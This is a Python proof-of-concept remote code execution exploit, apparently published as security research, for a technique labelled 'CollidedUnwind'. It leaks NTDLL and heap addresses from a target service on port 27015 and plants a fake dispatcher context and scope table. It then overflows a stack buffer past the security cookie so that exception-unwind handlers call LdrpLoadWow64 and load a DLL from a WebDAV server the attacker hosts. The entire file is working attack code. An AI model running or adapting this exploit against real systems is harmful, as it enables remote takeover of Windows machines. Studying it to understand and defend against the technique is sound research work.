from AppCommunicator import AppCommunicator
from CustomStructs import *
from WebDavHelper import WebDavHelper
from NetworkHelper import get_local_ip
from ctypes import sizeof, c_wchar, c_uint64
import sys


def parse_arguments():
    if len(sys.argv) < 3:
        raise Exception(f"Usage: exploit.py [target IP] [RtlpExecuteHandlerForUnwind offset] [__C_specific_handler offset] [RtlInitUnicodeStringEx offset] [LdrpLoadWow64 offset]")

    target_ip = sys.argv[1]
    rtlpexecutehandlerforunwind_offset = int(sys.argv[2], 16)
    chandler_offset = int(sys.argv[3], 16)
    rtlinitunicodestringex_offset = int(sys.argv[4], 16)
    ldrploadwow64_offset = int(sys.argv[5], 16)

    return target_ip, rtlpexecutehandlerforunwind_offset, chandler_offset, rtlinitunicodestringex_offset, ldrploadwow64_offset 


def exploit():
    # Read our arguments.
    target_ip, \
    rtlpexecutehandlerforunwind_offset, \
    chandler_offset, \
    rtlinitunicodestringex_offset, \
    ldrploadwow64_offset = parse_arguments()

    print(f"[~] CollidedUnwind RCE PoC by @BillDemirkapi")
    print(f"[~] Loaded the following arguments:")
    print(f"[~] \tTarget IP = {target_ip}")
    print(f"[~] \tRtlpExecuteHandlerForUnwind Offset = {hex(rtlpexecutehandlerforunwind_offset)}")
    print(f"[~] \t__C_specific_handler Offset = {hex(chandler_offset)}")
    print(f"[~] \tRtlInitUnicodeStringEx Offset = {hex(rtlinitunicodestringex_offset)}")
    print(f"[~] \tLdrpLoadWow64 Offset = {hex(ldrploadwow64_offset)}")

    print(f"[+] Starting WebDav server.")
    webdav_server = WebDavHelper()
    webdav_server.start_server()

    input("[~] Enter anything to trigger the exploit.")

    # Start by creating the structure instances we will populate later.
    # We need these initialized early to calculate the heap size to request.
    dispatcher_context = DispatcherContext()

    # The DLL path will be based on the local IP address.
    local_ip = get_local_ip()
    print(f"[+] Detected your local IP as {local_ip}. Note- target must be able to reach this IP.")
    dll_path_constant = f"\\\\;WebDavRedirector\\{get_local_ip()}\\\x00"
    dll_path_constant_wide = b""
    # Convert DLL path to wide string.
    for char in dll_path_constant:
        dll_path_constant_wide += char.encode() + b"\x00"
    
    # Create our malicious scope table for calling
    # RtlInitUnicodeStringEx and LdrpLoadWow64 consecutively.
    scope_table = ScopeTable()
    scope_table.Count = 2

    rtlinitunicodestringex_record = ScopeRecord()
    rtlinitunicodestringex_record.BeginAddress = 0
    rtlinitunicodestringex_record.EndAddress = 0xFFFFFFFF

    ldrploadwow64_record = ScopeRecord()
    ldrploadwow64_record.BeginAddress = 0
    ldrploadwow64_record.EndAddress = 0xFFFFFFFF

    # Honestly we only need the Rsp field from the context,
    # so this entire struct is a bit unnecessary. I'm
    # including it for readability/extensibility.
    context_record = PartialContext()

    # Calculate the total size of our heap data.
    total_len = sizeof(dispatcher_context) + \
                len(dll_path_constant_wide) + \
                sizeof(scope_table) + \
                sizeof(rtlinitunicodestringex_record) + \
                sizeof(ldrploadwow64_record) + \
                sizeof(context_record)

    print(f"[+] Requesting a leak and heap allocation of {hex(total_len)} bytes.")

    # Open a connection and request a leak/heap alloc.
    communicator = AppCommunicator(target_ip, 27015)
    response = communicator.request_leak(total_len)

    if not response.NtdllBaseAddress:
        raise Exception(f"Failed to leak NTDLL base address!")

    ntdll_base = response.NtdllBaseAddress
    heap_base = response.AllocatedHeapMemory
    print(f"[+] Leak and allocation successful! Details:")
    print(f"[+] \tNtdllBaseAddress = {hex(ntdll_base)}")
    print(f"[+] \tAllocatedHeapMemory = {hex(heap_base)}")

    # Now that we have a leak of ntdll and the heap, populate our structures.

    # Initialize our dispatcher context.
    dispatcher_context.FunctionEntry = 0
    dispatcher_context.HistoryTable = 0

    # As long as control pc is anything in ntdll
    # our scope table will catch it.
    dispatcher_context.ControlPc = ntdll_base + 123

    # Image base is used to calculate offset
    # to the fake exception handlers in our scope table.
    dispatcher_context.ImageBase = ntdll_base

    # The language handler is the exception routine
    # that gets called. Set this to __C_specific_handler.
    dispatcher_context.LanguageHandler = ntdll_base + chandler_offset

    # We just need Rsp in context record to be valid.
    context_record.Rsp = heap_base
    dispatcher_context.ContextRecord = heap_base + (total_len - sizeof(context_record))


    # EstablisherFrame is our RDX/second argument.
    # We need to point it at the DLL path constant.
    dispatcher_context.EstablisherFrame = heap_base + sizeof(dispatcher_context)

    # HandlerData needs to point at the ScopeRecord.
    dispatcher_context.HandlerData = heap_base + \
                                     sizeof(dispatcher_context) + \
                                     len(dll_path_constant_wide)

    # Initialize the scope records.
    rtlinitunicodestringex_record.HandlerAddress = rtlinitunicodestringex_offset
    rtlinitunicodestringex_record.JumpTarget = 1
    ldrploadwow64_record.HandlerAddress = ldrploadwow64_offset
    ldrploadwow64_record.JumpTarget = 1

    # Generate the full heap data we need to copy to our target.
    heap_data = bytes(dispatcher_context) + \
                dll_path_constant_wide + \
                bytes(scope_table) + \
                bytes(rtlinitunicodestringex_record) + \
                bytes(ldrploadwow64_record) + \
                bytes(context_record)
    
    print(f"[+] Finished generating the heap buffer. Copying to target.")

    # Copy the generated buffer to the target heap.
    communicator.request_heap_copy(heap_data)

    # Generate our overflow buffer.
    # Constant size of the overflowBuffer in target.
    overflow_buffer_size = 16
    # Constant size of the security cookie.
    security_cookie_size = 8
    # Offset to dispatcher context.
    dispatcher_context_stack_offset = 0x20
    # Address of RtlpExecuteHandlerForUnwind.
    rtlpexecutehandlerforunwind_address = c_uint64(ntdll_base + rtlpexecutehandlerforunwind_offset)

    overflow_buffer = b""
    overflow_buffer += b"\x00"*overflow_buffer_size  # Skip the overflowBuffer.
    overflow_buffer += b"\x00"*security_cookie_size  # Skip the security cookie.
    overflow_buffer += bytes(rtlpexecutehandlerforunwind_address)  # Our fake return address.
    overflow_buffer += b"\x00"*dispatcher_context_stack_offset  # Padding until dispatcher context pointer.
    overflow_buffer += bytes(c_uint64(heap_base))

    print(f"[+] Generated overflow buffer of size {hex(len(overflow_buffer))}.")

    print(f"[+] Triggering exploit, good luck!")
    
    communicator.request_overflow(overflow_buffer)

    # Enter any key to exit.
    input("[+] Enter anything to exit.\n")


if __name__ == "__main__":
    exploit()
